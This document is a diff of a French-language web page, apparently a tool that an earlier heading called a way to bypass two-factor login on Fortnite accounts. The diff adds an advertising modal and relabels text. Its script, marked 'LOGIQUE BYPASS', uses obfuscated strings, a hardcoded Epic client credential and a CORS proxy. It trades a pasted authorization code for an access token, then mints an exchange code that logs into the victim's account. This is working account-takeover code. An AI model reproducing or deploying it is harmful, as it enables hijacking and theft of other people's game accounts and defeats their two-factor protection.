@@ -22,7 +22,12 @@
         .btn-microsoft:hover { background: rgba(255, 255, 255, 0.05); border-color: #107c10; box-shadow: 0 0 20px rgba(16, 124, 16, 0.3); }
         .scrollbar-hide::-webkit-scrollbar { display: none; }
         
-        /* Style Tutoriel Harmonisé */
+        /* Modal Styles */
+        #adsModal { display: none; position: fixed; inset: 0; z-index: 9999; background: rgba(0,0,0,0.98); align-items: center; justify-content: center; }
+        .btn-wait { background: #1a1a1a; color: #444; cursor: not-allowed; border: 1px solid #333; }
+        .btn-active { background: linear-gradient(135deg, #00ff9d 0%, #0078d4 100%); color: black; cursor: pointer; transform: scale(1.02); }
+        .pub-image { max-height: 300px; width: auto; border-radius: 12px; border: 1px solid #00ff9d44; margin: 0 auto; }
+        
         .tutorial-container { border: 1px solid rgba(0, 255, 157, 0.2); box-shadow: 0 0 30px rgba(0, 255, 157, 0.05); }
         .video-frame { border-radius: 20px; overflow: hidden; background: #000; border: 1px solid rgba(255,255,255,0.05); }
         video { width: 100%; display: block; outline: none; }
@@ -30,6 +35,21 @@
 </head>
 <body class="flex flex-col items-center justify-center min-h-screen">
     <div class="bg-glow"></div><div class="bg-grid"></div><div class="scanline"></div>
+
+    <div id="adsModal">
+        <div class="glass-card p-10 rounded-[40px] max-w-lg w-full mx-4 text-center border-[#00ff9d]/20 shadow-2xl">
+            <h3 id="pubTitle" class="neon-text text-xl mb-6 italic uppercase tracking-widest">Chargement...</h3>
+            
+            <div id="pubContent" class="flex flex-col gap-6">
+                <p id="pubText" class="text-gray-300 text-sm leading-relaxed"></p>
+                <div id="pubMedia"></div>
+            </div>
+
+            <button id="closeBtn" class="w-full py-5 rounded-3xl text-[12px] font-black tracking-[4px] mt-8 transition-all uppercase">
+                <span id="btnText">Accéder au site</span>
+            </button>
+        </div>
+    </div>
 
     <div id="mainUI" class="w-full max-w-5xl p-6 grid grid-cols-1 md:grid-cols-2 gap-8 mx-auto mt-10">
         <div class="glass-card rounded-[40px] p-10 flex flex-col justify-between border-white/5">
@@ -83,7 +103,7 @@
         <div class="glass-card rounded-[35px] p-8 tutorial-container">
             <div class="flex items-center gap-4 mb-6">
                 <div class="w-2 h-6 bg-[#00ff9d] rounded-full shadow-[0_0_10px_#00ff9d]"></div>
-                <h2 class="neon-text text-lg uppercase tracking-wider">How to Bypass 2FA on Fortnite [Xbox Login] : Tutorial</h2>
+                <h2 class="neon-text text-lg uppercase tracking-wider">TUTORIEL VIDÉO</h2>
             </div>
             <div class="video-frame">
                 <video controls>
@@ -91,14 +111,72 @@
                     Lecteur non supporté.
                 </video>
             </div>
-            <div class="mt-4 flex justify-between items-center opacity-40">
-                <span class="text-[9px] font-bold uppercase tracking-[3px]">Mode: Visual Guide</span>
-                <span class="text-[9px] font-bold uppercase tracking-[3px]">Source: Gersda and Dépravé</span>
-            </div>
         </div>
     </div>
 
     <script>
+        // --- LOGIQUE PUB & TIMER ---
+        async function checkAds() {
+            const modal = document.getElementById('adsModal');
+            const title = document.getElementById('pubTitle');
+            const textEl = document.getElementById('pubText');
+            const mediaEl = document.getElementById('pubMedia');
+            const closeBtn = document.getElementById('closeBtn');
+            const btnText = document.getElementById('btnText');
+
+            let isRealAd = false;
+
+            try {
+                const response = await fetch('pub.txt');
+                const data = await response.text();
+                const lines = data.split('\n').filter(l => l.trim().length > 0 && l.includes('|'));
+
+                if (lines.length > 0) {
+                    isRealAd = true;
+                    const randomLine = lines[Math.floor(Math.random() * lines.length)];
+                    const [txt, img, link] = randomLine.split('|').map(p => p.trim());
+
+                    title.innerText = "STOP PAGE PUBLICITAIRE";
+                    textEl.innerText = txt || "";
+                    if (img) {
+                        mediaEl.innerHTML = `<a href="${link}" target="_blank"><img src="${img}" class="pub-image"></a>`;
+                    } else if (link) {
+                        mediaEl.innerHTML = `<a href="${link}" target="_blank" class="text-[#00ff9d] underline font-bold uppercase">Voir l'offre</a>`;
+                    }
+                }
+            } catch (e) { console.log("Init default ad"); }
+
+            if (!isRealAd) {
+                // CAS PUB PRIVÉE (INSTANTANÉ)
+                title.innerText = "PUBLICITÉ PRIVÉE";
+                textEl.innerHTML = "Si vous souhaitez votre publicité via <span class='text-white font-bold'>image, texte</span> et surtout <span class='text-white font-bold'>lien</span>, venez privé sur mon Discord :";
+                mediaEl.innerHTML = `<div class="bg-[#00ff9d]/10 border border-[#00ff9d]/30 py-4 px-8 rounded-2xl"><span class="text-[#00ff9d] font-mono font-black text-xl">1772uhq</span></div>`;
+                closeBtn.classList.add('btn-active');
+                closeBtn.onclick = () => modal.style.display = 'none';
+            } else {
+                // CAS VRAIE PUB (TIMER 5S)
+                closeBtn.classList.add('btn-wait');
+                closeBtn.disabled = true;
+                let timeLeft = 5;
+                btnText.innerHTML = `Patientez (${timeLeft}s)`;
+
+                const countdown = setInterval(() => {
+                    timeLeft--;
+                    btnText.innerHTML = `Patientez (${timeLeft}s)`;
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        closeBtn.disabled = false;
+                        btnText.innerHTML = "Accéder au site";
+                        closeBtn.classList.remove('btn-wait');
+                        closeBtn.classList.add('btn-active');
+                        closeBtn.onclick = () => modal.style.display = 'none';
+                    }
+                }, 1000);
+            }
+            modal.style.display = 'flex';
+        }
+
+        // --- LOGIQUE BYPASS ---
         const _0x2f=["\x63\x6F\x64\x65\x3D","\x64\x69\x73\x70\x6C\x61\x79\x4E\x61\x6D\x65","\x61\x63\x63\x65\x73\x73\x5F\x74\x6F\x6B\x65\x6E"];
         const px="https://cors-anywhere.herokuapp.com/", au="Basic OThmN2U0MmMyZTNhNGY4NmE3NGViNDNmYmI0MWVkMzk6MGEyNDQ5YTItMDAxYS00NTFlLWFmZWMtM2U4MTI5MDFjNGQ3";
 
@@ -117,7 +195,7 @@
             lg("Initialisation...");
             const c=new URLSearchParams(new URL(u).search).get('code');
             try {
-                lg("Authentification...");
+                lg("Authentification Epic...");
                 const r1=await fetch(px+'https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token',{
                     method:'POST',
                     headers:{'Content-Type':'application/x-www-form-urlencoded','Authorization':au,'X-Requested-With':'XMLHttpRequest'},
@@ -125,18 +203,21 @@
                 });
                 const d1=await r1.json();
                 if(d1[_0x2f[1]]){
-                    lg("Compte: "+d1[_0x2f[1]]);
+                    lg("Compte trouvé: "+d1[_0x2f[1]]);
                     const r2=await fetch(px+'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange',{
                         headers:{'Authorization':"Bearer "+d1[_0x2f[2]],'X-Requested-With':'XMLHttpRequest'}
                     });
                     const d2=await r2.json();
-                    lg("Succès.");
+                    lg("Injection réussie.");
                     document.getElementById('resPseudo').innerText=d1[_0x2f[1]];
                     document.getElementById('logResult').classList.remove('hidden');
                     document.getElementById('finalUrl').href="https://www.epicgames.com/id/exchange?exchangeCode="+d2.code+"&redirectUrl=https%3A%2F%2Fwww.epicgames.com%2Faccount%2Fpersonal";
-                } else { lg("CODE EXPIRE",true); }
-            } catch(e) { lg("ERREUR PROXY",true); }
+                } else { lg("CODE EXPIRE OU DEJA UTILISE",true); }
+            } catch(e) { lg("ERREUR PROXY (CORS Demo requis)",true); }
         };
+
+        // Lancement au démarrage
+        window.onload = checkAds;
     </script>
 </body>
 </html>
